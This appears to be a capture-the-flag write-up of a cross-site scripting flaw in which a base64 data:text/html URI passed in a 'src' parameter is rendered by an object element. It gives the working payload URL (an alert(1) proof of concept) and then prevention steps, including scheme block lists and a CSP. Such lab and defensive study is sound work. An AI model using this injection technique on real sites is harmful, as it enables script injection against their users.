# XSS Data attribute

The page renders the content inside `object` element with the `data` attribute.
This element is powerful enough to render a custom HTML content, both via URL and a local "blob" (structure `data:[mimeType],[content]`).

So to inject a 

```js
<script>alert(1)</script>
```

we need to convert it to base64 (`PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`), and the final `src` param becomes: `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`

# Payload

http://<ip>/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==


## How to prevent

- Validate and restrict input
Only allow trusted URL schemes (http, https)

- Explicitly block dangerous schemes like:
data:
javascript:

- Properly escape user input before injecting into HTML attributes

- Use a strong CSP:

Content-Security-Policy: default-src 'self'; object-src 'none';
object-src 'none' disables <object> entirely
Prevents execution of injected content